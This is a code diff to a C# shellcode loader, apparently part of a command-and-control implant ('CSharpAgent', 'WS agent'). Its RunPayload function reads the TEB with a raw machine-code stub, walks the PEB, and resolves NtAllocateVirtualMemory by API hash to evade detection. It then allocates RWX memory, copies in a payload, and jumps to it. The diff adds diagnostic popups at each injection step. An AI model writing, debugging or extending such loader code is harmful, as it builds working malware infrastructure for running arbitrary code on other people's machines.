@@ -7,6 +7,12 @@ namespace CSharpAgent
     {
         internal static void RunPayload(byte[] bytes)
         {
+            // DIAGNOSTIC popups on every inject step ([inj n]): a native crash in the stub
+            // walk or the payload kills the process WITHOUT unwinding — no managed catch, no
+            // [exit] popup — so the LAST caption a vanished run showed names the exact killer.
+            // Addresses print as hex (Diag.Hex); the NtAllocateVirtualMemory NTSTATUS is now
+            // captured and shown instead of silently discarded.
+
             // Detect native ARM64 at runtime so the correct execution stub is selected. IntPtr.Size
             // alone can't separate ARM64 from x64 (both 8), so we also check the system arch.
             SYSTEM_INFO sysInfo;
@@ -24,6 +30,9 @@ namespace CSharpAgent
                 // mov eax, dword ptr fs:[0x18]; ret
                 asm = new byte[] { 0x64, 0xA1, 0x18, 0, 0, 0, 0xC3 };
 
+            Diag.Show("[inj 1] arch", (isArm64 ? "ARM64" : IntPtr.Size == 8 ? "x86_64" : "i386") +
+                " — TEB stub " + asm.Length + " bytes, " + bytes.Length + " payload bytes");
+
             IntPtr ptr = Marshal.AllocHGlobal(asm.Length);
             Marshal.Copy(asm, 0, ptr, asm.Length);
 
@@ -34,7 +43,9 @@ namespace CSharpAgent
                 NativeImports.FlushInstructionCache(new IntPtr(-1), ptr, (UIntPtr)asm.Length);
 
             var getTEB = (GetTEBDelegate)Marshal.GetDelegateForFunctionPointer(ptr, typeof(GetTEBDelegate));
+            Diag.Show("[inj 2] TEB stub", "calling the get-TEB stub at " + Diag.Hex(ptr));
             IntPtr tebAddress = getTEB();
+            Diag.Show("[inj 3] TEB", Diag.Hex(tebAddress));
 
             NativeImports.ChangeMemoryProtection(ptr, (UIntPtr)asm.Length, oldProtect, out oldProtect);
             Marshal.FreeHGlobal(ptr);
@@ -49,12 +60,18 @@ namespace CSharpAgent
             IntPtr ntdllHandle = Marshal.ReadIntPtr(IntPtrAdd(secondEntry, IntPtr.Size == 8 ? 32 : 16));
             IntPtr ntAllocatePtr = GetProcAddressByHash(ntdllHandle, 3580609816);
 
+            Diag.Show("[inj 4] PEB walk", "PEB " + Diag.Hex(pebAddress) + ", Ldr " + Diag.Hex(loaderDataAddress) +
+                ", ntdll " + Diag.Hex(ntdllHandle) + ", NtAllocateVirtualMemory " + Diag.Hex(ntAllocatePtr));
+            if (ntAllocatePtr == IntPtr.Zero)
+                throw new InvalidOperationException("NtAllocateVirtualMemory hash resolve missed — ntdll export walk failed");
+
             var ntAllocateVirtualMemory = (NtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer(ntAllocatePtr, typeof(NtAllocateVirtualMemory));
 
             IntPtr pMemory = IntPtr.Zero;
             UIntPtr regionSize = (UIntPtr)bytes.Length;
 
-            ntAllocateVirtualMemory(
+            Diag.Show("[inj 5] alloc", "NtAllocateVirtualMemory — commit+reserve " + bytes.Length + " bytes RWX");
+            var nt = ntAllocateVirtualMemory(
                 new IntPtr(-1),
                 ref pMemory,
                 IntPtr.Zero,
@@ -62,6 +79,10 @@ namespace CSharpAgent
                 0x1000 | 0x2000,
                 0x40
             );
+            Diag.Show("[inj 6] alloc result", "NTSTATUS 0x" + ((uint)nt).ToString("X8") +
+                " — base " + Diag.Hex(pMemory) + ", region " + regionSize.ToUInt64() + " bytes");
+            if (pMemory == IntPtr.Zero)
+                throw new InvalidOperationException("NtAllocateVirtualMemory failed — NTSTATUS 0x" + ((uint)nt).ToString("X8"));
 
             Marshal.Copy(bytes, 0, pMemory, bytes.Length);
 
@@ -78,10 +99,17 @@ namespace CSharpAgent
 
             int offset = (IntPtr.Size == 8) ? 0x50 : 0x28;
             Marshal.WriteIntPtr(tebAddress, offset, parametersMemory);
+            Diag.Show("[inj 7] staged", "payload copied, parameters written to TEB+" +
+                offset.ToString("X") + " (" + Diag.Hex(parametersMemory) + ") — handoff ready");
 
             var entry = (EntryDelegate)Marshal.GetDelegateForFunctionPointer(pMemory, typeof(EntryDelegate));
+            Diag.Show("[inj 8] entry", "CALLING the PIC agent at " + Diag.Hex(pMemory) +
+                " — this thread is the WS agent's from now on; if the process VANISHES after " +
+                "this box, the payload crashed natively (no managed catch can fire)");
             entry(uint.MaxValue);
 
+            Diag.Show("[inj 9] entry RETURNED", "unexpected — the PIC agent returned immediately " +
+                "(early bail on this box?); the reply reports status 0 anyway");
             Marshal.FreeHGlobal(parametersMemory);
         }
 
